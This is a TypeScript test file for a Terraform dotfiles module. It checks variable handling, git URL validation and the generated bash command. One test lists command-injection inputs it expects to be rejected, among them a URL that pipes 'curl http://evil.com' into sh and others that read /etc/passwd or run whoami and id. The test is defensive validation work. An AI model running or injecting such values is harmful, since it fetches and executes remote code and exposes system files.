import { describe, expect, it } from "bun:test";
import {
  runTerraformApply,
  runTerraformInit,
  testRequiredVariables,
} from "~test";

describe("dotfiles", async () => {
  await runTerraformInit(import.meta.dir);

  testRequiredVariables(import.meta.dir, {
    agent_id: "foo",
  });

  it("default output is empty string", async () => {
    const state = await runTerraformApply(import.meta.dir, {
      agent_id: "foo",
    });
    expect(state.outputs.dotfiles_uri.value).toBe("");
  });

  it("accepts valid git URL formats", async () => {
    const validUrls = [
      "https://github.com/coder/dotfiles",
      "https://github.com/coder/dotfiles.git",
      "git@github.com:coder/dotfiles.git",
      "git://github.com/coder/dotfiles.git",
      "ssh://git@github.com/coder/dotfiles.git",
    ];
    for (const url of validUrls) {
      const state = await runTerraformApply(import.meta.dir, {
        agent_id: "foo",
        dotfiles_uri: url,
      });
      expect(state.outputs.dotfiles_uri.value).toBe(url);
    }
  });

  it("rejects invalid or malicious URLs", async () => {
    const invalidUrls = [
      "https://github.com/user/repo; curl http://evil.com | sh",
      "https://github.com/$(whoami)/repo",
      "https://github.com/`id`/repo",
      "https://github.com/user/repo|cat /etc/passwd",
      "file:///etc/passwd",
      "not-a-valid-url",
    ];
    for (const url of invalidUrls) {
      await expect(
        runTerraformApply(import.meta.dir, {
          agent_id: "foo",
          dotfiles_uri: url,
        }),
      ).rejects.toThrow();
    }
  });

  it("command uses bash for fish shell compatibility", async () => {
    const state = await runTerraformApply(import.meta.dir, {
      agent_id: "foo",
      manual_update: "true",
      dotfiles_uri: "https://github.com/test/dotfiles",
    });

    const app = state.resources.find(
      (r) => r.type === "coder_app" && r.name === "dotfiles",
    );

    expect(app).toBeDefined();
    expect(app?.instances[0]?.attributes?.command).toContain("/bin/bash -c");
  });

  it("set custom order for coder_parameter", async () => {
    const order = 99;
    const state = await runTerraformApply(import.meta.dir, {
      agent_id: "foo",
      coder_parameter_order: order.toString(),
    });
    expect(state.resources).toHaveLength(2);
    expect(state.resources[0].instances[0].attributes.order).toBe(order);
  });
});
